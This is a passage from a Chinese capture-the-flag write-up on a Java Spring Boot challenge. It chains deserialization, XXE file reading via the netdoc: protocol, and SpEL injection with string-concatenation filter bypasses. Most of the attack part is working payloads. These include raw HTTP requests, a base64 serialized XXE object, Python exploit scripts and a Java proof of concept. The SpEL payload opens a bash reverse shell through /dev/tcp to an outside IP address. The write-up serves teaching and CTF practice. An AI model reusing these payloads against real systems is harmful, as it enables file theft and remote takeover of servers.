<h5 id="同时重写了resolveClass方法，重新定义了白名单的类加载名称。"><a href="#同时重写了resolveClass方法，重新定义了白名单的类加载名称。" class="headerlink" title="同时重写了resolveClass方法，重新定义了白名单的类加载名称。"></a>同时重写了<code>resolveClass</code>方法，重新定义了白名单的类加载名称。</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> Class&lt;?&gt; resolveClass(ObjectStreamClass des) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!Arrays.asList(whitelist).contains(des.getName())) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">"Cannot deserialize "</span> + des.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(des);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="0x3-Man-class"><a href="#0x3-Man-class" class="headerlink" title="0x3 Man.class"></a>0x3 Man.class</h4><h5 id="这个类重写了readObject定义了反序列化时的特殊处理。"><a href="#这个类重写了readObject定义了反序列化时的特殊处理。" class="headerlink" title="这个类重写了readObject定义了反序列化时的特殊处理。"></a>这个类重写了<code>readObject</code>定义了反序列化时的特殊处理。</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream requestStream)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException, ParserConfigurationException, SAXException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> paramInt = requestStream.readInt();</span><br><span class="line">    <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[paramInt];</span><br><span class="line">    </span><br><span class="line">    requestStream.read(arrayOfByte);</span><br><span class="line">    String xmlcontent = <span class="keyword">new</span> String(arrayOfByte);</span><br><span class="line">    </span><br><span class="line">    Pattern pattern = Pattern.compile(<span class="string">"file"</span>, <span class="number">2</span>);</span><br><span class="line">    Matcher matcher = pattern.matcher(xmlcontent);</span><br><span class="line">    <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">      <span class="keyword">this</span>.name = <span class="string">"bad hacker"</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    ByteArrayInputStream localByteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(arrayOfByte);</span><br><span class="line">    DocumentBuilderFactory localDocumentBuilderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">    localDocumentBuilderFactory.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">    DocumentBuilder localDocumentBuilder = localDocumentBuilderFactory.newDocumentBuilder();</span><br><span class="line">    Document localDocument = localDocumentBuilder.parse(localByteArrayInputStream);</span><br><span class="line">    NodeList nodeList = localDocument.getElementsByTagName(<span class="string">"name"</span>);</span><br><span class="line">    Node node = nodeList.item(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">this</span>.name = node.getTextContent();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h5 id="不过有段代码我们应该要重视。"><a href="#不过有段代码我们应该要重视。" class="headerlink" title="不过有段代码我们应该要重视。"></a>不过有段代码我们应该要重视。</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory localDocumentBuilderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">localDocumentBuilderFactory.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">DocumentBuilder localDocumentBuilder = localDocumentBuilderFactory.newDocumentBuilder();</span><br><span class="line">Document localDocument = localDocumentBuilder.parse(localByteArrayInputStream);</span><br><span class="line">NodeList nodeList = localDocument.getElementsByTagName(<span class="string">"name"</span>);</span><br><span class="line">Node node = nodeList.item(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">this</span>.name = node.getTextContent();</span><br></pre></td></tr></table></figure>

<h5 id="上面代码是用来解析xml，可以看到没有任何的限制那么就存在xxe漏洞。"><a href="#上面代码是用来解析xml，可以看到没有任何的限制那么就存在xxe漏洞。" class="headerlink" title="上面代码是用来解析xml，可以看到没有任何的限制那么就存在xxe漏洞。"></a>上面代码是用来解析<code>xml</code>，可以看到没有任何的限制那么就存在xxe漏洞。</h5><h4 id="0x4-综上所述："><a href="#0x4-综上所述：" class="headerlink" title="0x4 综上所述："></a>0x4 综上所述：</h4><h5 id="1-我们要先构造requestStram通过序列化和反序列化的数据进行xxe读取secret的内容。"><a href="#1-我们要先构造requestStram通过序列化和反序列化的数据进行xxe读取secret的内容。" class="headerlink" title="1.我们要先构造requestStram通过序列化和反序列化的数据进行xxe读取secret的内容。"></a>1.我们要先构造<code>requestStram</code>通过序列化和反序列化的数据进行xxe读取<code>secret</code>的内容。</h5><h5 id="3-我们要进行SPEL注入执行shell命令。"><a href="#3-我们要进行SPEL注入执行shell命令。" class="headerlink" title="3.我们要进行SPEL注入执行shell命令。"></a>3.我们要进行<code>SPEL</code>注入执行shell命令。</h5><h5 id="4-由于在Man-clss中过滤了file字段因此我们不能用file-协议来读取-passwd下的内容，不要忘记我们现在使用的空架是sprint-boot，那么我们还有一个协议可以替代file-协议，我们可以用netdoc-来任意文件读取。"><a href="#4-由于在Man-clss中过滤了file字段因此我们不能用file-协议来读取-passwd下的内容，不要忘记我们现在使用的空架是sprint-boot，那么我们还有一个协议可以替代file-协议，我们可以用netdoc-来任意文件读取。" class="headerlink" title="4.由于在Man.clss中过滤了file字段因此我们不能用file://协议来读取/passwd下的内容，不要忘记我们现在使用的空架是sprint-boot，那么我们还有一个协议可以替代file://协议，我们可以用netdoc:/来任意文件读取。"></a>4.由于在<code>Man.clss</code>中过滤了<code>file</code>字段因此我们不能用<code>file://</code>协议来读取<code>/passwd</code>下的内容，不要忘记我们现在使用的空架是<code>sprint-boot</code>，那么我们还有一个协议可以替代<code>file://</code>协议，我们可以用<code>netdoc:/</code>来任意文件读取。</h5><h5 id="5-对于SPEL注入的过滤我们可以用字符串拼接来绕过。"><a href="#5-对于SPEL注入的过滤我们可以用字符串拼接来绕过。" class="headerlink" title="5.对于SPEL注入的过滤我们可以用字符串拼接来绕过。"></a>5.对于<code>SPEL</code>注入的过滤我们可以用字符串拼接来绕过。</h5><h4 id="0x02-payload1"><a href="#0x02-payload1" class="headerlink" title="0x02 payload1:"></a>0x02 payload1:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /server HTTP/1.1</span><br><span class="line">Host: 101.71.29.5:10038</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 228</span><br><span class="line"></span><br><span class="line">rO0ABXNyABJjb20udW5jdGYucG9qby5NYW4AAAAAA0FqawMAAUwABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHdlAAAAYTw/eG1sIHZlcnNpb249IjEuMCI/PjwhRE9DVFlQRSBrYWlicm9bPCFFTlRJVFkgeHhlIFNZU1RFTSAibmV0ZG9jOi8uL3Bhc3N3ZCI+XT48bmFtZT4meHhlOzwvbmFtZT54</span><br></pre></td></tr></table></figure>

<h5 id="结果如下："><a href="#结果如下：" class="headerlink" title="结果如下："></a>结果如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Server: nginx/1.14.2</span><br><span class="line">Date: Thu, 24 Oct 2019 11:31:24 GMT</span><br><span class="line">Content-Type: text/html;charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 42</span><br><span class="line"></span><br><span class="line">Hello k8Xnld8zOR2FhXEEnv3j3LQAiYGcb5IaPdVj</span><br></pre></td></tr></table></figure>

<h4 id="0x03-payload2："><a href="#0x03-payload2：" class="headerlink" title="0x03 payload2："></a>0x03 payload2：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Host: 101.71.29.5:10038</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 395</span><br><span class="line"></span><br><span class="line">secret=k8Xnld8zOR2FhXEEnv3j3LQAiYGcb5IaPdVj&amp;name=T(String).getClass().forName(&quot;java.l&quot;%2b&quot;ang.Ru&quot;%2b&quot;ntime&quot;).getMethod(&quot;ex&quot;%2b&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;%2b&quot;ang.Ru&quot;%2b&quot;ntime&quot;).getMethod(&quot;getRu&quot;%2b&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;%2b&quot;ang.Ru&quot;%2b&quot;ntime&quot;)),new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -c &apos;bash -i &gt;/dev/tcp/123.57.232.69/8080 0&gt;%261&apos;&quot;&#125;)</span><br></pre></td></tr></table></figure>

<h5 id="结果如下：-1"><a href="#结果如下：-1" class="headerlink" title="结果如下："></a>结果如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Server: nginx/1.14.2</span><br><span class="line">Date: Fri, 25 Oct 2019 11:53:56 GMT</span><br><span class="line">Content-Type: text/html;charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">java.lang.UNIXProcess@3dccbf57</span><br></pre></td></tr></table></figure>

<h4 id="0x04-下面给出xxe的脚本："><a href="#0x04-下面给出xxe的脚本：" class="headerlink" title="0x04 下面给出xxe的脚本："></a>0x04 下面给出xxe的脚本：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># with open("./name.ser") as f:</span></span><br><span class="line"><span class="comment">#    x=f.read()</span></span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span></span><br><span class="line">&#125;</span><br><span class="line">data=x</span><br><span class="line">str=<span class="string">'rO0ABXNyABJjb20udW5jdGYucG9qby5NYW4AAAAAA0FqawMAAUwABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHdlAAAAYTw/eG1sIHZlcnNpb249IjEuMCI/PjwhRE9DVFlQRSBrYWlicm9bPCFFTlRJVFkgeHhlIFNZU1RFTSAibmV0ZG9jOi8uL3Bhc3N3ZCI+XT48bmFtZT4meHhlOzwvbmFtZT54'</span></span><br><span class="line">r=requests.post(<span class="string">"http://101.71.29.5:10038/server"</span>,data=str,headers=headers)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br><span class="line"><span class="keyword">print</span> base64.b64decode(str)</span><br></pre></td></tr></table></figure>

<h5 id="0x05-下面是RCE的脚本："><a href="#0x05-下面是RCE的脚本：" class="headerlink" title="0x05 下面是RCE的脚本："></a>0x05 下面是RCE的脚本：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://101.71.29.5:10038/admin"</span></span><br><span class="line">datas=&#123;</span><br><span class="line">    <span class="string">"secret"</span>:<span class="string">"k8Xnld8zOR2FhXEEnv3j3LQAiYGcb5IaPdVj"</span>,</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"/bin/bash\",\"-c\",\"bash -c 'bash -i &gt;/dev/tcp/123.57.232.69/8080 0&gt;%261'\"&#125;)"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">&#125;</span><br><span class="line">res=requests.post(url=url,headers=headers,data=datas)</span><br><span class="line"><span class="keyword">print</span> res.text</span><br></pre></td></tr></table></figure>

<h5 id="0x06-下面是java的本地测试代码："><a href="#0x06-下面是java的本地测试代码：" class="headerlink" title="0x06 下面是java的本地测试代码："></a>0x06 下面是java的本地测试代码：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.unctf.solve;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> String name;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">54618731L</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Man</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		String payload = (<span class="string">"&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE kaibro[&lt;!ENTITY xxe SYSTEM \"file:///C:/Users/liangjie/Desktop/flag.txt\"&gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;"</span>);</span><br><span class="line">		out.writeInt(payload.length());</span><br><span class="line">		out.write(payload.getBytes());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream requestStream)</span></span></span><br><span class="line"><span class="function">			<span class="keyword">throws</span> ClassNotFoundException, IOException, ParserConfigurationException, SAXException </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> paramInt = requestStream.readInt();</span><br><span class="line">		<span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[paramInt];</span><br><span class="line"></span><br><span class="line">		requestStream.read(arrayOfByte);</span><br><span class="line">		String xmlcontent = <span class="keyword">new</span> String(arrayOfByte);</span><br><span class="line"></span><br><span class="line">		Pattern pattern = Pattern.compile(<span class="string">"file"</span>, <span class="number">2</span>);</span><br><span class="line">		Matcher matcher = pattern.matcher(xmlcontent);</span><br><span class="line">		<span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">			<span class="keyword">this</span>.name = <span class="string">"bad hacker"</span>;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ByteArrayInputStream localByteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(arrayOfByte);</span><br><span class="line">		DocumentBuilderFactory localDocumentBuilderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">		localDocumentBuilderFactory.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">		DocumentBuilder localDocumentBuilder = localDocumentBuilderFactory.newDocumentBuilder();</span><br><span class="line">		Document localDocument = localDocumentBuilder.parse(localByteArrayInputStream);</span><br><span class="line">		NodeList nodeList = localDocument.getElementsByTagName(<span class="string">"name"</span>);</span><br><span class="line">		Node node = nodeList.item(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">this</span>.name = node.getTextContent();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OIS</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] whitelist = &#123; <span class="string">"com.unctf.solve.Man"</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">OIS</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(is);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass des) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">//		System.out.print(des.getName());</span></span><br><span class="line">		<span class="keyword">if</span> (!Arrays.asList(whitelist).contains(des.getName())) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">"Cannot deserialize "</span> + des.getName());</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(des);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload2</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		Man p = <span class="keyword">new</span> Man(<span class="string">"kaibro"</span>);</span><br><span class="line">		ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">		ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">		oos.writeObject(p);</span><br><span class="line">		oos.flush();</span><br><span class="line"></span><br><span class="line">		Base64.Encoder base64 = Base64.getEncoder();</span><br><span class="line"><span class="comment">//		byte[] result = base64.encode(out.toByteArray());</span></span><br><span class="line">		String result=base64.encodeToString(out.toByteArray());</span><br><span class="line">		Base64.Decoder base = Base64.getDecoder();</span><br><span class="line">		<span class="keyword">byte</span>[] requestStream = base.decode(result);</span><br><span class="line">		InputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(requestStream);</span><br><span class="line"></span><br><span class="line">		OIS ois = <span class="keyword">new</span> OIS(inputStream);</span><br><span class="line">		Man man = (Man) ois.readObject();</span><br><span class="line">		ois.close();</span><br><span class="line"></span><br><span class="line">		System.out.println(man.name);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="这里先留一个坑，用java写个脚本。"><a href="#这里先留一个坑，用java写个脚本。" class="headerlink" title="这里先留一个坑，用java写个脚本。"></a>这里先留一个坑，用java写个脚本。</h5><h4 id="0x07-下面是上面用的的各种知识的学习和了解："><a href="#0x07-下面是上面用的的各种知识的学习和了解：" class="headerlink" title="0x07 下面是上面用的的各种知识的学习和了解："></a>0x07 下面是上面用的的各种知识的学习和了解：</h4><h5 id="0x1-java的序列化反序列化基础。"><a href="#0x1-java的序列化反序列化基础。" class="headerlink" title="0x1 java的序列化反序列化基础。"></a>0x1 java的序列化反序列化基础。</h5><h5 id="什么是序列化反序列化："><a href="#什么是序列化反序列化：" class="headerlink" title="什么是序列化反序列化："></a>什么是序列化反序列化：</h5><h6 id="Java描述的是一个‘世界’，程序运行开始时，这个‘世界’也开始运作，但‘世界’中的对象不是一成不变的，它的属性会随着程序的运行而改变。"><a href="#Java描述的是一个‘世界’，程序运行开始时，这个‘世界’也开始运作，但‘世界’中的对象不是一成不变的，它的属性会随着程序的运行而改变。" class="headerlink" title="Java描述的是一个‘世界’，程序运行开始时，这个‘世界’也开始运作，但‘世界’中的对象不是一成不变的，它的属性会随着程序的运行而改变。"></a>Java描述的是一个‘世界’，程序运行开始时，这个‘世界’也开始运作，但‘世界’中的对象不是一成不变的，它的属性会随着程序的运行而改变。</h6><h6 id="但很多情况下，我们需要保存某一刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。"><a href="#但很多情况下，我们需要保存某一刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。" class="headerlink" title="但很多情况下，我们需要保存某一刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。"></a>但很多情况下，我们需要保存某一刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。</h6><h6 id="一个类的对象要想序列化成功，必须满足两个条件："><a href="#一个类的对象要想序列化成功，必须满足两个条件：" class="headerlink" title="一个类的对象要想序列化成功，必须满足两个条件："></a>一个类的对象要想序列化成功，必须满足两个条件：</h6><h5 id="该类必须实现-java-io-Serializable-接口。"><a href="#该类必须实现-java-io-Serializable-接口。" class="headerlink" title="该类必须实现 java.io.Serializable 接口。"></a>该类必须实现 java.io.Serializable 接口。</h5><h6 id="1-该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。"><a href="#1-该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。" class="headerlink" title="1.该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。"></a>1.该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</h6><h6 id="2-如果你想知道一个-Java-标准类是否是可序列化的，可以通过查看该类的文档-查看该类有没有实现-java-io-Serializable接口。"><a href="#2-如果你想知道一个-Java-标准类是否是可序列化的，可以通过查看该类的文档-查看该类有没有实现-java-io-Serializable接口。" class="headerlink" title="2.如果你想知道一个 Java 标准类是否是可序列化的，可以通过查看该类的文档,查看该类有没有实现 java.io.Serializable接口。"></a>2.如果你想知道一个 Java 标准类是否是可序列化的，可以通过查看该类的文档,查看该类有没有实现 